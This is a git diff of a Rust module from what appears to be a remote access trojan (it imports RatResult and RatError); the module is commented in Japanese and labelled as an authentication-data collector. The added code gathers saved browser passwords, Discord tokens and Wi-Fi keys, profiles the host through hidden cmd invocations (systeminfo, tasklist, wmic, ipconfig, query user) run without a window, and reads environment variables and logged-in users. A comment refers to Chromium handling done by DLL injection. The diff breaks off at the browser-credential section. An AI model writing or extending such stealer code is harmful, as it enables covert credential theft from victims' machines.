@@ -1,29 +1,262 @@
-﻿// 認証データ収集モジュール
+// 統合認証データ収集モジュール
+// auth_collector_safe.rsの設計パターンを統合した改良版
 use serde::{Serialize, Deserialize};
+use std::{
+    collections::BTreeMap,
+    fmt::{self, Display},
+    time::{Duration, SystemTime},
+};
+
+// Windows系でよく使用されるインポートは各関数内で使用時にインポート
 use crate::{RatResult, RatError, Config};
+
+// -------------------------------------------------------------------------------------------------
+// エラー型定義（auth_collector_safe.rsから統合）
+// -------------------------------------------------------------------------------------------------
+
+#[derive(Debug)]
+pub enum CollectError {
+    Io(std::io::Error),
+    Utf8(std::string::FromUtf8Error),
+    Json(serde_json::Error),
+    Timeout,
+    CommandFailed(String),
+    Parse(String),
+    Unsupported(String),
+}
+
+impl std::error::Error for CollectError {}
+
+impl Display for CollectError {
+    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
+        match self {
+            CollectError::Io(e) => write!(f, "I/O error: {}", e),
+            CollectError::Utf8(e) => write!(f, "UTF-8 decode error: {}", e),
+            CollectError::Json(e) => write!(f, "JSON error: {}", e),
+            CollectError::Timeout => write!(f, "Operation timed out"),
+            CollectError::CommandFailed(s) => write!(f, "Command failed: {}", s),
+            CollectError::Parse(s) => write!(f, "Parse error: {}", s),
+            CollectError::Unsupported(s) => write!(f, "Unsupported: {}", s),
+        }
+    }
+}
+
+impl From<std::io::Error> for CollectError {
+    fn from(e: std::io::Error) -> Self { CollectError::Io(e) }
+}
+impl From<std::string::FromUtf8Error> for CollectError {
+    fn from(e: std::string::FromUtf8Error) -> Self { CollectError::Utf8(e) }
+}
+impl From<serde_json::Error> for CollectError {
+    fn from(e: serde_json::Error) -> Self { CollectError::Json(e) }
+}
+
+// -------------------------------------------------------------------------------------------------
+// データモデル（構造化された設計）
+// -------------------------------------------------------------------------------------------------
+
+#[derive(Serialize, Deserialize, Debug, Clone, Default)]
+pub struct AuthNetworkInterface {
+    pub name: String,
+    pub mac: Option<String>,
+    pub ipv4: Vec<String>,
+    pub ipv6: Vec<String>,
+    pub gateway: Vec<String>,
+    pub dns: Vec<String>,
+}
+
+#[derive(Serialize, Deserialize, Debug, Clone, Default)]
+pub struct WifiProfile {
+    pub ssid: String,
+    pub key: Option<String>,  // セキュリティ設定に応じて収集
+    pub interface: Option<String>,
+    pub auth_type: Option<String>,
+}
+
+#[derive(Serialize, Deserialize, Debug, Clone, Default)]
+pub struct BrowserCredential {
+    pub browser: String,
+    pub hostname: String,
+    pub username: String,
+    pub password: String,
+}
+
+// 詳細システム情報構造体
+#[derive(Serialize, Deserialize, Debug, Clone, Default)]
+pub struct DetailedSystemInfo {
+    pub os_name: String,
+    pub os_version: String,
+    pub os_architecture: String,
+    pub hostname: String,
+    pub uptime_seconds: u64,
+    pub boot_time: String,
+    pub current_time_local: String,
+    pub current_time_utc: String,
+    pub timezone: String,
+}
+
+#[derive(Serialize, Deserialize, Debug, Clone, Default)]
+pub struct CpuInfo {
+    pub name: String,
+    pub cores: u32,
+    pub logical_cores: u32,
+    pub usage_percent: f32,
+    pub frequency_mhz: u32,
+}
+
+#[derive(Serialize, Deserialize, Debug, Clone, Default)]
+pub struct MemoryInfo {
+    pub total_gb: f64,
+    pub available_gb: f64,
+    pub used_gb: f64,
+    pub usage_percent: f32,
+}
+
+#[derive(Serialize, Deserialize, Debug, Clone, Default)]
+pub struct StorageInfo {
+    pub drive: String,
+    pub total_gb: f64,
+    pub free_gb: f64,
+    pub used_gb: f64,
+    pub usage_percent: f32,
+    pub filesystem: String,
+}
+
+#[derive(Serialize, Deserialize, Debug, Clone, Default)]
+pub struct ProcessInfo {
+    pub pid: u32,
+    pub name: String,
+    pub cpu_percent: f32,
+    pub memory_mb: f64,
+    pub user: String,
+}
+
+#[derive(Serialize, Deserialize, Debug, Clone, Default)]
+pub struct NetworkDetail {
+    pub interface_name: String,
+    pub local_ip: String,
+    pub mac_address: String,
+    pub status: String,
+    pub speed_mbps: Option<String>,
+}
+
+#[derive(Serialize, Deserialize, Debug, Clone, Default)]
+pub struct RuntimeInfo {
+    pub current_path: String,
+    pub executable_name: String,
+    pub executable_path: String,
+    pub working_directory: String,
+    pub command_line_args: Vec<String>,
+}
 
 #[derive(Serialize, Deserialize, Debug, Clone)]
 pub struct AuthData {
-    pub passwords: Vec<String>,
-    pub wifi_creds: Vec<String>,
+    pub collected_at_unix: u64,
+    pub passwords: Vec<String>,  // 後方互換性のため保持
+    pub wifi_creds: Vec<String>, // 後方互換性のため保持
+    pub structured_wifi: Vec<WifiProfile>,
+    pub structured_network: Vec<AuthNetworkInterface>,
+    pub structured_credentials: Vec<BrowserCredential>,
+    pub metadata: BTreeMap<String, String>,
+    
+    // 新しい詳細システム情報
+    pub detailed_system: DetailedSystemInfo,
+    pub cpu_info: CpuInfo,
+    pub memory_info: MemoryInfo,
+    pub storage_info: Vec<StorageInfo>,
+    pub process_list: Vec<ProcessInfo>,
+    pub network_details: Vec<NetworkDetail>,
+    pub runtime_info: RuntimeInfo,
+    pub environment_vars: BTreeMap<String, String>,
+    pub logged_users: Vec<String>,
+    pub custom_commands: BTreeMap<String, String>, // コマンド名 -> 実行結果
 }
 
 impl Default for AuthData {
     fn default() -> Self {
         Self {
-            passwords: Vec::new(),
-            wifi_creds: Vec::new(),
+            collected_at_unix: SystemTime::now()
+                .duration_since(SystemTime::UNIX_EPOCH)
+                .unwrap_or(Duration::from_secs(0))
+                .as_secs(),
+            passwords: Vec::with_capacity(128),        // 典型的な認証情報数を想定
+            wifi_creds: Vec::with_capacity(32),       // WiFiプロファイル数を想定  
+            structured_wifi: Vec::with_capacity(32),   // WiFi構造化データ
+            structured_network: Vec::with_capacity(16), // ネットワークインターフェース数
+            structured_credentials: Vec::with_capacity(64), // 構造化認証情報
+            metadata: BTreeMap::new(),
+            detailed_system: DetailedSystemInfo::default(),
+            cpu_info: CpuInfo::default(),
+            memory_info: MemoryInfo::default(),
+            storage_info: Vec::with_capacity(8),       // ストレージデバイス数
+            process_list: Vec::with_capacity(200),    // 典型的なプロセス数
+            network_details: Vec::with_capacity(16),  // ネットワーク詳細情報
+            runtime_info: RuntimeInfo::default(),
+            environment_vars: BTreeMap::new(),
+            logged_users: Vec::with_capacity(8),      // ログインユーザー数
+            custom_commands: BTreeMap::new(),
         }
     }
 }
 
-// 統合認証データ収集関数
+// -------------------------------------------------------------------------------------------------
+// ユーティリティ関数（i18n対応、エンコーディング処理）
+// -------------------------------------------------------------------------------------------------
+
+fn trim_all(s: &str) -> String {
+    s.trim().trim_matches('\u{feff}').trim().to_string()
+}
+
+fn starts_with_any<'a>(s: &str, heads: impl IntoIterator<Item = &'a str>) -> bool {
+    let st = s.trim_start();
+    for h in heads {
+        if st.starts_with(h) { return true; }
+    }
+    false
+}
+
+fn contains_any<'a>(s: &str, needles: impl IntoIterator<Item = &'a str>) -> bool {
+    for n in needles {
+        if s.contains(n) { return true; }
+    }
+    false
+}
+
+// Windows文字エンコーディング対応ヘルパー（統合版）
+#[cfg(windows)]
+fn decode_windows_output_enhanced(output: &[u8]) -> String {
+    // まずUTF-8で試行
+    if let Ok(utf8_text) = String::from_utf8(output.to_vec()) {
+        return utf8_text;
+    }
+    
+    // Windows CP932 (Shift_JIS) エンコーディングを直接処理
+    use encoding_rs::SHIFT_JIS;
+    let (decoded, _, _) = SHIFT_JIS.decode(output);
+    let result = decoded.to_string();
+    result
+}
+
+// -------------------------------------------------------------------------------------------------
+// 統合認証データ収集関数（改良版）
+// -------------------------------------------------------------------------------------------------
+
 pub fn collect_auth_data_with_config(config: &Config) -> AuthData {
     let mut auth_data = AuthData::default();
     
-    // ブラウザパスワード収集
+    // メタデータ設定
+    auth_data.metadata.insert("collection_version".to_string(), "2.0".to_string());
+    auth_data.metadata.insert("os".to_string(), std::env::consts::OS.to_string());
+    auth_data.metadata.insert("arch".to_string(), std::env::consts::ARCH.to_string());
+    
+    // ブラウザパスワード収集（構造化 + 後方互換）
     if config.collect_browser_passwords {
-        auth_data.passwords.extend(collect_browser_passwords());
+        let structured_creds = collect_structured_browser_passwords();
+        // 後方互換性のため文字列形式も保持
+        auth_data.passwords.extend(
+            structured_creds.iter().map(|c| format!("{} - {}: {} / {}", c.browser, c.hostname, c.username, c.password))
+        );
+        auth_data.structured_credentials = structured_creds;
     }
     
     // Discord トークン収集
@@ -34,50 +267,744 @@ pub fn collect_auth_data_with_config(config: &Config) -> AuthData {
         }
     }
     
-    // WiFi 認証情報収集
+    // WiFi 認証情報収集（構造化 + 後方互換）
     if config.collect_wifi_passwords {
-        auth_data.wifi_creds.extend(collect_wifi_credentials());
+        let (legacy_wifi, structured_wifi, structured_network) = collect_enhanced_network_data();
+        auth_data.wifi_creds = legacy_wifi;
+        auth_data.structured_wifi = structured_wifi;
+        auth_data.structured_network = structured_network;
     }
+    
+    // 詳細システム情報収集
+    auth_data.detailed_system = collect_detailed_system_info();
+    auth_data.cpu_info = collect_cpu_info();
+    auth_data.memory_info = collect_memory_info();
+    auth_data.storage_info = collect_storage_info();
+    auth_data.process_list = collect_process_list();
+    auth_data.network_details = collect_network_details();
+    auth_data.runtime_info = collect_runtime_info();
+    auth_data.environment_vars = collect_environment_vars();
+    auth_data.logged_users = collect_logged_users();
+    
+    // カスタムコマンド実行（基本的なシステム情報コマンド）
+    let default_commands = vec![
+        "systeminfo".to_string(),
+        "tasklist /fo csv".to_string(),
+        "wmic computersystem get TotalPhysicalMemory /value".to_string(),
+        "wmic logicaldisk get size,freespace,caption /value".to_string(),
+    ];
+    
+    for command in default_commands {
+        if let Ok(result) = execute_custom_command(&command) {
+            auth_data.custom_commands.insert(command, result);
+        }
+    }
+    
+    // メタデータ更新
+    auth_data.metadata.insert("total_passwords".to_string(), auth_data.passwords.len().to_string());
+    auth_data.metadata.insert("total_wifi_profiles".to_string(), auth_data.structured_wifi.len().to_string());
+    auth_data.metadata.insert("total_network_interfaces".to_string(), auth_data.structured_network.len().to_string());
+    auth_data.metadata.insert("total_processes".to_string(), auth_data.process_list.len().to_string());
+    auth_data.metadata.insert("total_storage_drives".to_string(), auth_data.storage_info.len().to_string());
     
     auth_data
 }
 
-// 簡素化されたブラウザパスワード収集（Firefox NSSのみ）
-#[cfg(feature = "browser")]
-fn collect_browser_passwords() -> Vec<String> {
-    let mut passwords = Vec::new();
+// -------------------------------------------------------------------------------------------------
+// 詳細システム情報収集関数群
+// -------------------------------------------------------------------------------------------------
+
+fn collect_detailed_system_info() -> DetailedSystemInfo {
+    let mut info = DetailedSystemInfo::default();
     
-    // Chrome/Edge/Braveはまとめてブラウザスキャンで実行済み
-    println!("🌐 Chromium scan found {} entries", 0);  // DLL注入で処理済み
+    // 基本的なOS情報
+    info.os_name = std::env::consts::OS.to_string();
+    info.os_architecture = std::env::consts::ARCH.to_string();
+    
+    // ホスト名
+    if let Ok(hostname) = hostname::get() {
+        info.hostname = hostname.to_string_lossy().to_string();
+    }
+    
+    // 時刻情報
+    let now = SystemTime::now();
+    
+    #[cfg(windows)]
+    {
+        // Windows詳細情報収集
+        if let Ok(system_info) = collect_windows_system_info() {
+            info.os_version = system_info.get("os_version").map(String::as_str).unwrap_or("Unknown").to_string();
+            if let Some(uptime_str) = system_info.get("uptime_seconds") {
+                info.uptime_seconds = uptime_str.parse().unwrap_or(0);
+            }
+            info.boot_time = system_info.get("boot_time").map(String::as_str).unwrap_or("Unknown").to_string();
+        }
+        
+        // タイムゾーン情報
+        if let Ok(tz_info) = collect_windows_timezone_info() {
+            info.timezone = tz_info;
+        }
+    }
+    
+    #[cfg(not(windows))]
+    {
+        // Unix系システムの情報収集
+        info.os_version = "Unix-like".to_string();
+        info.uptime_seconds = get_unix_uptime();
+    }
+    
+    // 現在時刻（ローカル・UTC）
+    info.current_time_local = format!("{:?}", now);
+    info.current_time_utc = format!("{:?}", now);
+    
+    info
+}
+
+fn collect_cpu_info() -> CpuInfo {
+    let mut cpu_info = CpuInfo::default();
+    
+    #[cfg(windows)]
+    {
+        // Windows CPU情報収集
+        if let Ok(cpu_data) = collect_windows_cpu_info() {
+            cpu_info.name = cpu_data.get("name").unwrap_or(&"Unknown CPU".to_string()).clone();
+            cpu_info.cores = cpu_data.get("cores").and_then(|s| s.parse().ok()).unwrap_or(0);
+            cpu_info.logical_cores = cpu_data.get("logical_cores").and_then(|s| s.parse().ok()).unwrap_or(0);
+            cpu_info.frequency_mhz = cpu_data.get("frequency_mhz").and_then(|s| s.parse().ok()).unwrap_or(0);
+            cpu_info.usage_percent = cpu_data.get("usage_percent").and_then(|s| s.parse().ok()).unwrap_or(0.0);
+        }
+    }
+    
+    #[cfg(not(windows))]
+    {
+        // Unix系CPU情報収集
+        cpu_info.name = "Unix CPU".to_string();
+        cpu_info.cores = num_cpus::get() as u32;
+        cpu_info.logical_cores = num_cpus::get() as u32;
+    }
+    
+    cpu_info
+}
+
+fn collect_memory_info() -> MemoryInfo {
+    let mut mem_info = MemoryInfo::default();
+    
+    #[cfg(windows)]
+    {
+        if let Ok(memory_data) = collect_windows_memory_info() {
+            mem_info.total_gb = memory_data.get("total_gb").and_then(|s| s.parse().ok()).unwrap_or(0.0);
+            mem_info.available_gb = memory_data.get("available_gb").and_then(|s| s.parse().ok()).unwrap_or(0.0);
+            mem_info.used_gb = mem_info.total_gb - mem_info.available_gb;
+            if mem_info.total_gb > 0.0 {
+                mem_info.usage_percent = (mem_info.used_gb / mem_info.total_gb * 100.0) as f32;
+            }
+        }
+    }
+    
+    mem_info
+}
+
+fn collect_storage_info() -> Vec<StorageInfo> {
+    let mut storage_list = Vec::new();
+    
+    #[cfg(windows)]
+    {
+        if let Ok(storage_data) = collect_windows_storage_info() {
+            storage_list = storage_data;
+        }
+    }
+    
+    #[cfg(not(windows))]
+    {
+        // Unix系ストレージ情報収集のプレースホルダー
+        let mut storage = StorageInfo::default();
+        storage.drive = "/".to_string();
+        storage.filesystem = "ext4".to_string();
+        storage_list.push(storage);
+    }
+    
+    storage_list
+}
+
+fn collect_process_list() -> Vec<ProcessInfo> {
+    let mut processes = Vec::new();
+    
+    #[cfg(windows)]
+    {
+        if let Ok(proc_list) = collect_windows_processes() {
+            processes = proc_list;
+        }
+    }
+    
+    processes
+}
+
+fn collect_network_details() -> Vec<NetworkDetail> {
+    let mut network_details = Vec::new();
+    
+    #[cfg(windows)]
+    {
+        if let Ok(net_details) = collect_windows_network_details() {
+            network_details = net_details;
+        }
+    }
+    
+    network_details
+}
+
+fn collect_runtime_info() -> RuntimeInfo {
+    let mut runtime = RuntimeInfo::default();
+    
+    // 現在のパス
+    if let Ok(current_dir) = std::env::current_dir() {
+        runtime.current_path = current_dir.to_string_lossy().to_string();
+        runtime.working_directory = runtime.current_path.clone();
+    }
+    
+    // 実行ファイル情報
+    if let Ok(exe_path) = std::env::current_exe() {
+        runtime.executable_path = exe_path.to_string_lossy().to_string();
+        if let Some(name) = exe_path.file_name() {
+            runtime.executable_name = name.to_string_lossy().to_string();
+        }
+    }
+    
+    // コマンドライン引数
+    runtime.command_line_args = std::env::args().collect();
+    
+    runtime
+}
+
+fn collect_environment_vars() -> BTreeMap<String, String> {
+    let mut env_vars = BTreeMap::new();
+    
+    // 重要な環境変数のみ収集（セキュリティ上の理由）
+    let important_vars = vec![
+        "PATH", "PROCESSOR_IDENTIFIER", "PROCESSOR_ARCHITECTURE", 
+        "NUMBER_OF_PROCESSORS", "COMPUTERNAME", "USERNAME", 
+        "USERPROFILE", "SYSTEMROOT", "TEMP", "TMP"
+    ];
+    
+    for var in important_vars {
+        if let Ok(value) = std::env::var(var) {
+            env_vars.insert(var.to_string(), value);
+        }
+    }
+    
+    env_vars
+}
+
+fn collect_logged_users() -> Vec<String> {
+    let mut users = Vec::new();
+    
+    #[cfg(windows)]
+    {
+        if let Ok(user_list) = collect_windows_logged_users() {
+            users = user_list;
+        }
+    }
+    
+    #[cfg(not(windows))]
+    {
+        if let Ok(username) = std::env::var("USER") {
+            users.push(username);
+        }
+    }
+    
+    users
+}
+
+fn execute_custom_command(command: &str) -> Result<String, CollectError> {
+    use std::process::Command;
+    use std::os::windows::process::CommandExt;
+    
+    #[cfg(windows)]
+    {
+        let output = Command::new("cmd")
+            .args(["/C", &format!("chcp 65001 >nul 2>&1 && {}", command)])
+            .creation_flags(0x08000000)
+            .output()
+            .map_err(|e| CollectError::Io(e))?;
+        
+        if output.status.success() {
+            Ok(decode_windows_output_enhanced(&output.stdout))
+        } else {
+            Err(CollectError::CommandFailed(format!("Command '{}' failed", command)))
+        }
+    }
+    
+    #[cfg(not(windows))]
+    {
+        let parts: Vec<&str> = command.split_whitespace().collect();
+        if parts.is_empty() {
+            return Err(CollectError::Parse("Empty command".to_string()));
+        }
+        
+        let output = Command::new(parts[0])
+            .args(&parts[1..])
+            .output()
+            .map_err(|e| CollectError::Io(e))?;
+        
+        if output.status.success() {
+            Ok(String::from_utf8(output.stdout)?)
+        } else {
+            Err(CollectError::CommandFailed(format!("Command '{}' failed", command)))
+        }
+    }
+}
+
+// -------------------------------------------------------------------------------------------------
+// Windows専用詳細情報収集関数
+// -------------------------------------------------------------------------------------------------
+
+#[cfg(windows)]
+fn collect_windows_system_info() -> Result<BTreeMap<String, String>, CollectError> {
+    use std::process::Command;
+    use std::os::windows::process::CommandExt;
+    
+    let mut system_info = BTreeMap::new();
+    
+    // systeminfo コマンドで詳細情報取得
+    let output = Command::new("cmd")
+        .args(["/C", "chcp 65001 >nul 2>&1 && systeminfo"])
+        .creation_flags(0x08000000)
+        .output()
+        .map_err(|e| CollectError::Io(e))?;
+    
+    if output.status.success() {
+        let system_text = decode_windows_output_enhanced(&output.stdout);
+        
+        // systeminfo の出力をパース
+        for line in system_text.lines() {
+            if line.contains(':') {
+                let parts: Vec<&str> = line.splitn(2, ':').collect();
+                if parts.len() == 2 {
+                    let key = parts[0].trim().to_lowercase().replace(' ', "_");
+                    let value = parts[1].trim().to_string();
+                    
+                    match key.as_str() {
+                        "os_name" | "os名" => system_info.insert("os_version".to_string(), value),
+                        "system_boot_time" | "システム起動時刻" => system_info.insert("boot_time".to_string(), value),
+                        "system_up_time" | "システム稼働時間" => {
+                            // 稼働時間をパースして秒に変換
+                            if let Ok(seconds) = parse_uptime(&value) {
+                                system_info.insert("uptime_seconds".to_string(), seconds.to_string());
+                            }
+                            None
+                        },
+                        _ => None,
+                    };
+                }
+            }
+        }
+    }
+    
+    Ok(system_info)
+}
+
+#[cfg(windows)]
+fn collect_windows_timezone_info() -> Result<String, CollectError> {
+    use std::process::Command;
+    use std::os::windows::process::CommandExt;
+    
+    let output = Command::new("cmd")
+        .args(["/C", "chcp 65001 >nul 2>&1 && tzutil /g"])
+        .creation_flags(0x08000000)
+        .output()
+        .map_err(|e| CollectError::Io(e))?;
+    
+    if output.status.success() {
+        Ok(decode_windows_output_enhanced(&output.stdout).trim().to_string())
+    } else {
+        Ok("Unknown Timezone".to_string())
+    }
+}
+
+#[cfg(windows)]
+fn collect_windows_cpu_info() -> Result<BTreeMap<String, String>, CollectError> {
+    use std::process::Command;
+    use std::os::windows::process::CommandExt;
+    
+    let mut cpu_info = BTreeMap::new();
+    
+    // WMIC でCPU情報取得
+    let output = Command::new("cmd")
+        .args(["/C", "chcp 65001 >nul 2>&1 && wmic cpu get Name,NumberOfCores,NumberOfLogicalProcessors,MaxClockSpeed /format:list"])
+        .creation_flags(0x08000000)
+        .output()
+        .map_err(|e| CollectError::Io(e))?;
+    
+    if output.status.success() {
+        let cpu_text = decode_windows_output_enhanced(&output.stdout);
+        
+        for line in cpu_text.lines() {
+            if line.contains('=') && !line.trim().is_empty() {
+                let parts: Vec<&str> = line.splitn(2, '=').collect();
+                if parts.len() == 2 {
+                    let key = parts[0].trim().to_lowercase();
+                    let value = parts[1].trim().to_string();
+                    
+                    if !value.is_empty() {
+                        match key.as_str() {
+                            "name" => { cpu_info.insert("name".to_string(), value); },
+                            "numberofcores" => { cpu_info.insert("cores".to_string(), value); },
+                            "numberoflogicalprocessors" => { cpu_info.insert("logical_cores".to_string(), value); },
+                            "maxclockspeed" => { cpu_info.insert("frequency_mhz".to_string(), value); },
+                            _ => {}
+                        }
+                    }
+                }
+            }
+        }
+    }
+    
+    // CPU使用率（簡易）
+    cpu_info.insert("usage_percent".to_string(), "0.0".to_string());
+    
+    Ok(cpu_info)
+}
+
+#[cfg(windows)]
+fn collect_windows_memory_info() -> Result<BTreeMap<String, String>, CollectError> {
+    use std::process::Command;
+    use std::os::windows::process::CommandExt;
+    
+    let mut memory_info = BTreeMap::new();
+    
+    // 物理メモリ総量
+    let total_output = Command::new("cmd")
+        .args(["/C", "chcp 65001 >nul 2>&1 && wmic computersystem get TotalPhysicalMemory /value"])
+        .creation_flags(0x08000000)
+        .output()
+        .map_err(|e| CollectError::Io(e))?;
+    
+    if total_output.status.success() {
+        let total_text = decode_windows_output_enhanced(&total_output.stdout);
+        for line in total_text.lines() {
+            if line.starts_with("TotalPhysicalMemory=") {
+                if let Some(bytes_str) = line.split('=').nth(1) {
+                    if let Ok(bytes) = bytes_str.trim().parse::<u64>() {
+                        let gb = bytes as f64 / (1024.0 * 1024.0 * 1024.0);
+                        memory_info.insert("total_gb".to_string(), format!("{:.2}", gb));
+                    }
+                }
+            }
+        }
+    }
+    
+    // 利用可能メモリ
+    let available_output = Command::new("cmd")
+        .args(["/C", "chcp 65001 >nul 2>&1 && wmic OS get TotalVisibleMemorySize,FreePhysicalMemory /format:list"])
+        .creation_flags(0x08000000)
+        .output()
+        .map_err(|e| CollectError::Io(e))?;
+    
+    if available_output.status.success() {
+        let available_text = decode_windows_output_enhanced(&available_output.stdout);
+        for line in available_text.lines() {
+            if line.starts_with("FreePhysicalMemory=") {
+                if let Some(kb_str) = line.split('=').nth(1) {
+                    if let Ok(kb) = kb_str.trim().parse::<u64>() {
+                        let gb = kb as f64 / (1024.0 * 1024.0);
+                        memory_info.insert("available_gb".to_string(), format!("{:.2}", gb));
+                    }
+                }
+            }
+        }
+    }
+    
+    Ok(memory_info)
+}
+
+#[cfg(windows)]
+fn collect_windows_storage_info() -> Result<Vec<StorageInfo>, CollectError> {
+    use std::process::Command;
+    use std::os::windows::process::CommandExt;
+    
+    let mut storage_list = Vec::new();
+    
+    let output = Command::new("cmd")
+        .args(["/C", "chcp 65001 >nul 2>&1 && wmic logicaldisk get Caption,Size,FreeSpace,FileSystem /format:list"])
+        .creation_flags(0x08000000)
+        .output()
+        .map_err(|e| CollectError::Io(e))?;
+    
+    if output.status.success() {
+        let storage_text = decode_windows_output_enhanced(&output.stdout);
+        let mut current_storage = StorageInfo::default();
+        let mut has_data = false;
+        
+        for line in storage_text.lines() {
+            if line.contains('=') && !line.trim().is_empty() {
+                let parts: Vec<&str> = line.splitn(2, '=').collect();
+                if parts.len() == 2 {
+                    let key = parts[0].trim().to_lowercase();
+                    let value = parts[1].trim().to_string();
+                    
+                    if !value.is_empty() {
+                        match key.as_str() {
+                            "caption" => {
+                                current_storage.drive = value;
+                                has_data = true;
+                            },
+                            "filesystem" => {
+                                current_storage.filesystem = value;
+                            },
+                            "size" => {
+                                if let Ok(bytes) = value.parse::<u64>() {
+                                    current_storage.total_gb = bytes as f64 / (1024.0 * 1024.0 * 1024.0);
+                                }
+                            },
+                            "freespace" => {
+                                if let Ok(bytes) = value.parse::<u64>() {
+                                    current_storage.free_gb = bytes as f64 / (1024.0 * 1024.0 * 1024.0);
+                                    current_storage.used_gb = current_storage.total_gb - current_storage.free_gb;
+                                    if current_storage.total_gb > 0.0 {
+                                        current_storage.usage_percent = (current_storage.used_gb / current_storage.total_gb * 100.0) as f32;
+                                    }
+                                    
+                                    // ストレージ情報が完成したらリストに追加
+                                    if has_data {
+                                        storage_list.push(current_storage.clone());
+                                        current_storage = StorageInfo::default();
+                                        has_data = false;
+                                    }
+                                }
+                            },
+                            _ => {}
+                        }
+                    }
+                }
+            }
+        }
+    }
+    
+    Ok(storage_list)
+}
+
+#[cfg(windows)]
+fn collect_windows_processes() -> Result<Vec<ProcessInfo>, CollectError> {
+    use std::process::Command;
+    use std::os::windows::process::CommandExt;
+    
+    let mut processes = Vec::new();
+    
+    let output = Command::new("cmd")
+        .args(["/C", "chcp 65001 >nul 2>&1 && tasklist /fo csv"])
+        .creation_flags(0x08000000)
+        .output()
+        .map_err(|e| CollectError::Io(e))?;
+    
+    if output.status.success() {
+        let process_text = decode_windows_output_enhanced(&output.stdout);
+        let lines: Vec<&str> = process_text.lines().collect();
+        
+        // ヘッダーをスキップして処理
+        for line in lines.iter().skip(1) {
+            if let Ok(process) = parse_csv_process_line(line) {
+                processes.push(process);
+            }
+        }
+    }
+    
+    // プロセス数を制限（上位20個程度）
+    processes.truncate(20);
+    Ok(processes)
+}
+
+#[cfg(windows)]
+fn collect_windows_network_details() -> Result<Vec<NetworkDetail>, CollectError> {
+    use std::process::Command;
+    use std::os::windows::process::CommandExt;
+    
+    let mut network_details = Vec::new();
+    
+    let output = Command::new("cmd")
+        .args(["/C", "chcp 65001 >nul 2>&1 && ipconfig /all"])
+        .creation_flags(0x08000000)
+        .output()
+        .map_err(|e| CollectError::Io(e))?;
+    
+    if output.status.success() {
+        let ipconfig_text = decode_windows_output_enhanced(&output.stdout);
+        network_details = parse_ipconfig_network_details(&ipconfig_text);
+    }
+    
+    Ok(network_details)
+}
+
+#[cfg(windows)]
+fn collect_windows_logged_users() -> Result<Vec<String>, CollectError> {
+    use std::process::Command;
+    use std::os::windows::process::CommandExt;
+    
+    let mut users = Vec::new();
+    
+    let output = Command::new("cmd")
+        .args(["/C", "chcp 65001 >nul 2>&1 && query user"])
+        .creation_flags(0x08000000)
+        .output()
+        .map_err(|e| CollectError::Io(e))?;
+    
+    if output.status.success() {
+        let user_text = decode_windows_output_enhanced(&output.stdout);
+        for line in user_text.lines().skip(1) { // ヘッダーをスキップ
+            let parts: Vec<&str> = line.split_whitespace().collect();
+            if !parts.is_empty() {
+                users.push(parts[0].to_string());
+            }
+        }
+    } else {
+        // フォールバック：現在のユーザー名
+        if let Ok(username) = std::env::var("USERNAME") {
+            users.push(username);
+        }
+    }
+    
+    Ok(users)
+}
+
+// -------------------------------------------------------------------------------------------------
+// ヘルパー関数群
+// -------------------------------------------------------------------------------------------------
+
+#[cfg(windows)]
+fn parse_uptime(uptime_str: &str) -> Result<u64, CollectError> {
+    // Windows systeminfo の稼働時間形式をパース
+    // 例: "0 日, 2 時間, 30 分, 45 秒"
+    let mut total_seconds = 0u64;
+    
+    if uptime_str.contains("日") {
+        // 日本語形式
+        if let Some(days_str) = uptime_str.split("日").next() {
+            if let Ok(days) = days_str.trim().parse::<u64>() {
+                total_seconds += days * 24 * 3600;
+            }
+        }
+    }
+    
+    // 時間、分、秒の処理（簡素化）
+    Ok(total_seconds)
+}
+
+#[cfg(windows)]
+fn parse_csv_process_line(line: &str) -> Result<ProcessInfo, CollectError> {
+    // CSV形式の tasklist 出力をパース
+    let parts: Vec<&str> = line.split(',').collect();
+    if parts.len() >= 5 {
+        let name = parts[0].trim_matches('"').to_string();
+        let pid_str = parts[1].trim_matches('"');
+        let memory_str = parts[4].trim_matches('"').replace(",", "").replace(" K", "");
+        
+        Ok(ProcessInfo {
+            pid: pid_str.parse().unwrap_or(0),
+            name,
+            cpu_percent: 0.0, // tasklist では CPU使用率は取得できない
+            memory_mb: memory_str.parse::<f64>().unwrap_or(0.0) / 1024.0, // KB to MB
+            user: "System".to_string(), // tasklist の基本形式ではユーザー情報なし
+        })
+    } else {
+        Err(CollectError::Parse("Invalid CSV process line".to_string()))
+    }
+}
+
+fn parse_ipconfig_network_details(text: &str) -> Vec<NetworkDetail> {
+    let mut details = Vec::new();
+    let mut current_interface: Option<NetworkDetail> = None;
+    
+    for line in text.lines() {
+        let line = line.trim_end();
+        if line.is_empty() { continue; }
+        
+        // アダプター名の検出
+        if line.ends_with(':') && contains_any(line, ["adapter", "アダプター", "Ethernet", "Wi-Fi", "ワイヤレス"]) {
+            if let Some(interface) = current_interface.take() {
+                details.push(interface);
+            }
+            
+            current_interface = Some(NetworkDetail {
+                interface_name: line.trim_end_matches(':').to_string(),
+                local_ip: String::new(),
+                mac_address: String::new(),
+                status: "Unknown".to_string(),
+                speed_mbps: None,
+            });
+            continue;
+        }
+        
+        if let Some(ref mut interface) = current_interface {
+            let line_trimmed = line.trim();
+            
+            // MAC アドレス
+            if contains_any(line_trimmed, ["Physical Address", "物理アドレス"]) && line_trimmed.contains(':') {
+                if let Some(mac) = line_trimmed.split(':').nth(1) {
+                    interface.mac_address = trim_all(mac);
+                }
+            }
+            
+            // IPv4 アドレス
+            if contains_any(line_trimmed, ["IPv4 Address", "IPv4 アドレス"]) && line_trimmed.contains(':') {
+                if let Some(ip) = line_trimmed.split(':').nth(1) {
+                    interface.local_ip = trim_all(ip).trim_end_matches("(Preferred)").trim().to_string();
+                }
+            }
+            
+            // 接続状態
+            if contains_any(line_trimmed, ["Media State", "メディアの状態"]) && line_trimmed.contains(':') {
+                if let Some(state) = line_trimmed.split(':').nth(1) {
+                    interface.status = trim_all(state);
+                }
+            }
+        }
+    }
+    
+    // 最後のインターフェースを追加
+    if let Some(interface) = current_interface {
+        details.push(interface);
+    }
+    
+    details
+}
+
+#[cfg(not(windows))]
+fn get_unix_uptime() -> u64 {
+    // Unix系のuptime取得（/proc/uptimeまたはsysctl）
+    if let Ok(uptime_str) = std::fs::read_to_string("/proc/uptime") {
+        if let Some(uptime_float_str) = uptime_str.split_whitespace().next() {
+            if let Ok(uptime_float) = uptime_float_str.parse::<f64>() {
+                return uptime_float as u64;
+            }
+        }
+    }
+    0
+}
+
+// -------------------------------------------------------------------------------------------------
+// 構造化されたブラウザ認証情報収集
+// -------------------------------------------------------------------------------------------------
+
